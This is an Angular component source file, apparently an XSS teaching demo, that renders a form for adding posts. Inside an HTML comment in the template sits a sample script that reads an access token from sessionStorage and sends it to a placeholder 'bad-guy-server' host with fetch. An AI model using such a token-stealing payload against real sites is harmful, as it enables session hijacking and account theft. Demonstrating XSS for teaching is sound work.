import { Component, OnInit } from '@angular/core';

import { XSSService } from './xss.service';

@Component({
  selector: 'xss-component',
  template: `
    <h1>Add a post</h1>
  <form class="d-flex col" >
    <mat-form-field appearance="fill">
      <mat-label>Title</mat-label>
      <input matInput [(ngModel)]="post.title" name="title">
    </mat-form-field>

    <mat-form-field appearance="fill">
      <mat-label>Post content</mat-label>
      <textarea rows="10" matInput [(ngModel)]="post.content" name="content"></textarea>
    </mat-form-field>
    <div>
      <button mat-raised-button color="primary" (click)="submit()">Submit</button>
    </div>
  </form>
  <!--
  <script>  
    const token = sessionStorage.getItem("accessToken");
    fetch('https://bad-guy-server?token=' + token);
</script>
  
  -->
  `,
  styles: [`
  form {
    max-width: 450px;
    margin: 0 auto;
  }
  `]
})
export class XSSComponent{

  post = {
    title: '',
    content: ''
  }

  constructor(private readonly  xSSService: XSSService) {}

  submit() {
    this.xSSService.posts.push(JSON.parse(JSON.stringify(this.post)))
    this.post = {title: '', content: ''};
    alert('You post was saved to the server');
  }
}
